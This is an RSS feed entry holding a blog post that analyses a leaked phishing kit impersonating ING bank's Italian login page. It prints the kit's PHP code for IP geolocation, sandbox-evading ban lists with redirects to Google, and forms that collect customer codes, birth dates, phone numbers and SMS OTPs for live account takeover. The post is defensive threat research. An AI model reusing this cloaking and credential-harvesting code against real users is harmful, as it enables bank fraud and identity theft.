@@ -1,0 +1,274 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ingbank on andpalmier's blog</title><link>https://andpalmier.com/tags/ingbank/</link><description>Recent content in Ingbank on andpalmier's blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 12 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://andpalmier.com/tags/ingbank/index.xml" rel="self" type="application/rss+xml"/><item><title>Phishing findings, campaign #3: ING bank</title><link>https://andpalmier.com/posts/phishing-findings-3/</link><pubDate>Mon, 12 Apr 2021 00:00:00 +0000</pubDate><guid>https://andpalmier.com/posts/phishing-findings-3/</guid><description>&lt;p&gt;I started hunting and reporting phishing websites on Twitter: follow me &lt;a href="https://twitter.com/andpalmier" target="_blank" rel="noreferrer"&gt;here&lt;/a&gt; if you are interested!
+In this series of posts I am going to analyze and discuss some of the phishing kits found online.&lt;/p&gt;
+&lt;h2 class="relative group"&gt;Let&amp;rsquo;s start from the beginning
+&lt;div id="lets-start-from-the-beginning" class="anchor"&gt;&lt;/div&gt;
+&lt;/h2&gt;
+&lt;p&gt;I found this kit while analyzing the phishing sites reported by &lt;a href="https://twitter.com/illegalfawn" target="_blank" rel="noreferrer"&gt;@illegalfawn&lt;/a&gt;. The zip was left exposed in the page, I believe the malicious actor forgot to remove it.&lt;/p&gt;
+&lt;p&gt;The name of the zip is interesting: &lt;code&gt;POSTEITASLIANE.zip&lt;/code&gt;. For non Italians, the name is referring to &lt;a href="https://posteitaliane.it" target="_blank" rel="noreferrer"&gt;Poste Italiane&lt;/a&gt;, the Italian postal service provider, which also offers financial services and is often target of phishing pages.&lt;/p&gt;
+&lt;p&gt;Besides having a typo in the name of the service, the kit - surprisingly - is not targeting Poste Italiane, but ING bank.&lt;/p&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="https://andpalmier.com/images/posts/phishing-findings/ep3/ing.webp" alt="ING bank phishing" /&gt;
+&lt;figcaption&gt;The phishing page&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;h2 class="relative group"&gt;Exploring the kit
+&lt;div id="exploring-the-kit" class="anchor"&gt;&lt;/div&gt;
+&lt;/h2&gt;
+&lt;p&gt;This kit is quite large, as it contains 475 files and 48 directories. Many items are taken directly from the Italian ING webpage, such as images, stylesheet files and JS scripts.&lt;/p&gt;
+&lt;p&gt;If we check the metadata of the other files, we can see that they were modified on the 4th of March, indicating that this kit is recent:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ mdls index.php
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;_kMDItemDisplayNameWithExtensions&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;index.php&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;kMDItemContentCreationDate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 2021-03-04 16:16:56 +0000
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;kMDItemContentCreationDate_Ranking&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 2021-03-04 00:00:00 +0000
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;kMDItemContentModificationDate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 2021-03-04 16:16:56 +0000
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;kMDItemContentModificationDate_Ranking&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 2021-03-04 00:00:00 +0000
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;kMDItemContentType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;public.php-script&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 class="relative group"&gt;index.php
+&lt;div id="indexphp" class="anchor"&gt;&lt;/div&gt;
+&lt;/h3&gt;
+&lt;p&gt;The entry point of the kit is &lt;code&gt;index.php&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$hash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$ip&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;http://www.geoplugin.net/json.gp?ip=&lt;/span&gt;&lt;span class="si"&gt;$ip&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;url_get_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$ch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;curl_init&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$url&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;curl_setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$ch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;CURLOPT_RETURNTRANSFER&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;curl_setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$ch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;CURLOPT_FOLLOWLOCATION&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;curl_setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$ch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;CURLOPT_SSL_VERIFYPEER&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;curl_setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$ch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;CURLOPT_SSL_VERIFYHOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;curl_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$ch&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;curl_close&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$ch&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$json&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;url_get_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$url&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$json&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;json_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$json&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$country&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$json&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;geoplugin_countryName&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# if($country == &amp;#34;Italy&amp;#34;||$country == &amp;#34;United Kingdom&amp;#34; || $country == &amp;#34;Bulgaria&amp;#34;) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$ban_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;logs/banlist.txt&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$ban_file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;FILE_IGNORE_NEW_LINES&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nx"&gt;FILE_SKIP_EMPTY_LINES&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;in_array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$list&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Location: https://www.google.com&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;auth&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Location: login.php?&amp;amp;sessionid=&lt;/span&gt;&lt;span class="si"&gt;$hash&lt;/span&gt;&lt;span class="s2"&gt;&amp;amp;securessl=true&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# else {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# header(&amp;#39;Location: https://www.google.com&amp;#39;);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Part of the code is commented out, indicating that the developer was testing different approaches.&lt;/p&gt;
+&lt;p&gt;In the lines above, the kit uses &lt;a href="https://geoplugin.net" target="_blank" rel="noreferrer"&gt;geoplugin.net&lt;/a&gt; to detect the country from which the victim is connecting by using the IP address; this technique is quite common for phishing kits. We can see from the comments, that the actor was probably targeting victims from Italy, UK and Bulgaria.&lt;/p&gt;
+&lt;p&gt;The code is then referring to a file called &lt;code&gt;banlist.txt&lt;/code&gt;, which should contains a list of IP addresses to be blocked. If the IP of the visitor of the page is in this list, the page will redirect to Google. &lt;code&gt;banlist.txt&lt;/code&gt; is not in the zip file, but we can assume it contains a list of IP addresses of known sandboxes, just like it was done for the LinkedIn kit analyzed in a previous post:&lt;/p&gt;
+&lt;section class="space-y-10 w-full"&gt;
+&lt;article class="article-link--shortcode flex flex-col md:flex-row relative overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600"&gt;
+&lt;div class="flex-none relative overflow-hidden thumbnail"&gt;
+&lt;img
+src="https://andpalmier.com/posts/phishing-findings-2/featured_hu_b2369cef321717c5.jpg"
+role="presentation"
+loading="lazy"
+decoding="async"
+class="not-prose absolute inset-0 w-full h-full object-cover"&gt;
+&lt;/div&gt;
+&lt;div class=" p-4 pt-2"&gt;
+&lt;header class="items-center text-start text-xl font-semibold"&gt;
+&lt;a
+href="https://andpalmier.com/posts/phishing-findings-2/"
+class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2"&gt;
+&lt;h2&gt;
+Phishing findings, campaign #2: content.zip (LinkedIn)
+&lt;/h2&gt;
+&lt;/a&gt;
+&lt;/header&gt;
+&lt;div class="text-sm text-neutral-500 dark:text-neutral-400"&gt;
+&lt;div class="flex flex-row flex-wrap items-center"&gt;
+&lt;time datetime="2020-07-08T00:00:00&amp;#43;00:00"&gt;8 July 2020&lt;/time&gt;&lt;span class="px-2 text-primary-500"&gt;&amp;middot;&lt;/span&gt;&lt;span title="Reading time"&gt;8 mins&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="flex flex-row flex-wrap items-center"&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/article&gt;
+&lt;/section&gt;
+&lt;p&gt;In case the IP address of the victim is not in &lt;code&gt;banlist.txt&lt;/code&gt;, the visitor is redirected to &lt;code&gt;login.php&lt;/code&gt; with a new session ID, obtained from the md5 hash of the IP address.&lt;/p&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="https://andpalmier.com/images/posts/phishing-findings/ep3/login.webp" alt="login php of the kit" /&gt;
+&lt;figcaption&gt;ING Bank kit: login.php&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;The victim, by clicking on the link, is presented the page above, saying that the account of the visitor has been disabled temporarily for security reasons. If we click on the button, the message disappears, and we are now presented with a page asking for our client ID, birth date and phone number (you can see a screenshot of this page at the very beginning of this post).&lt;/p&gt;
+&lt;p&gt;Interestingly, the page presents itself with a paragraph, on the left, where it says that &lt;em&gt;&amp;ldquo;the codes entered will be doubly protected against phishing and spyware&amp;rdquo;&lt;/em&gt;, because after the visitor enters the login details, &amp;ldquo;&lt;em&gt;it will be shown information which only ING can have&amp;rdquo;&lt;/em&gt;. Of course, this dialog is copied directly from the original ING login page for Italian customers, which you can see below:&lt;/p&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="https://andpalmier.com/images/posts/phishing-findings/ep3/realing.webp" alt="ING Bank login for Italian customers" /&gt;
+&lt;figcaption&gt;Real ING Bankg login page for Italian customers&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;Actually, a lot of the code of the page is copied directly from the original ING login page, but - of course - there are some small changes, especially in the forms.&lt;/p&gt;
+&lt;p&gt;Here is the form from the original ING page:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;form&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;aspnetform&amp;#34;&lt;/span&gt; &lt;span class="nx"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;post&amp;#34;&lt;/span&gt; &lt;span class="nx"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;./loginsso.aspx&amp;#34;&lt;/span&gt; &lt;span class="nx"&gt;onsubmit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;javascript
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;:return webform_onsubmit();&amp;#34;&lt;/span&gt; &lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;aspnetform&amp;#34;&lt;/span&gt; &lt;span class="nx"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;vvc_form_enabled&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;while this is the one of the kit:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;form&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;aspnetForm&amp;#34;&lt;/span&gt; &lt;span class="nx"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;post&amp;#34;&lt;/span&gt; &lt;span class="nx"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;pin.php?&amp;amp;sessionid=
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; &amp;lt;?php echo &lt;/span&gt;&lt;span class="si"&gt;$hash&lt;/span&gt;&lt;span class="s2"&gt;; ?&amp;gt; &amp;amp;securessl=true&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;onsubmit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;javascript:return WebForm_OnSubmit();&amp;#34;&lt;/span&gt; &lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;aspnetForm&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;vvc_form_enabled&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The &lt;code&gt;action&lt;/code&gt; attribute is different and - again - we see a submission with the parameters &lt;code&gt;sessionid&lt;/code&gt; and &lt;code&gt;securessl&lt;/code&gt;, with the first still being the hash of the IP address of the visitor.
+The fields submitted to the form are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Customer code, with input name &lt;code&gt;ctl00\$cphContenuto\$Login ContainerUC1\$LoginStepCifUC1\$txtcc&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Birth date, with input name &lt;code&gt;ctl00\$cphContenuto\$Login ContainerUC1\$LoginStepCifUC1\$txtgg&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Phone number, with input name &lt;code&gt;ctl00\$cphContenuto\$Login ContainerUC1\$LoginStepCifUC1\$txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 class="relative group"&gt;pin.php
+&lt;div id="pinphp" class="anchor"&gt;&lt;/div&gt;
+&lt;/h3&gt;
+&lt;p&gt;Let&amp;rsquo;s see how they are used in &lt;code&gt;pin.php&lt;/code&gt;:&lt;/p&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="https://andpalmier.com/images/posts/phishing-findings/ep3/pin.webp" alt="PIN phishing of ING bank" /&gt;
+&lt;figcaption&gt;ING Bank kit: pin.php&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;This page is asking for an OTP code that the victim should have received via SMS. This means that the actor is - either manually or with an automated agent - performing the login access to ING Bank with the credentials of the victim while the victim is still on the phishing page: otherwise the OTP code would expire and not useful for signing in. If the mechanics seems a bit confusing, don&amp;rsquo;t worry, I will make a summary of the details of the process before the conclusion of this post!&lt;/p&gt;
+&lt;p&gt;For now, let&amp;rsquo;s focus on the code, here is the beginning of the PHP for &lt;code&gt;pin.php&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;auth&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Location: http://www.google.com&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$v_ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$hash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$v_ip&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;In the code above, the page is - once again - redirecting visitors which do not have the &lt;code&gt;auth&lt;/code&gt; parameter to Google, to avoid detection.&lt;/p&gt;
